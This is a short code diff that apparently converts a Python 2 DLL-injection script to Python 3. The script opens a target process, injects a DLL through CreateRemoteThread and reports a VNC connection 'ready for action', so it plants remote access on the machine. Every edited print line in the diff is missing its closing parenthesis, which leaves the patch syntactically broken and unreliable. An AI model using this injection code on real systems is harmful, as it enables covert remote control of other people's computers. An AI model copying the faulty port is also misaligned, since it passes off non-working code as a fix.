@@ -15,7 +15,7 @@ h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
 
 if not h_process:
 
-    print "[*] Couldn't acquire a handle to PID: %s" % pid
+    print("[*] Couldn't acquire a handle to PID: %s" % pid
     sys.exit(0)
 
 
@@ -36,9 +36,9 @@ thread_id = c_ulong(0)
 
 if not kernel32.CreateRemoteThread(h_process,None,0,h_loadlib,arg_address,0,byref(thread_id)):
 
-    print "[*] Failed to inject the DLL. Exiting."
+    print("[*] Failed to inject the DLL. Exiting."
     sys.exit(0)
 
 
-print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value
-print "[*] VNC Connection now open and ready for action...."
+print("[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value
+print("[*] VNC Connection now open and ready for action...."
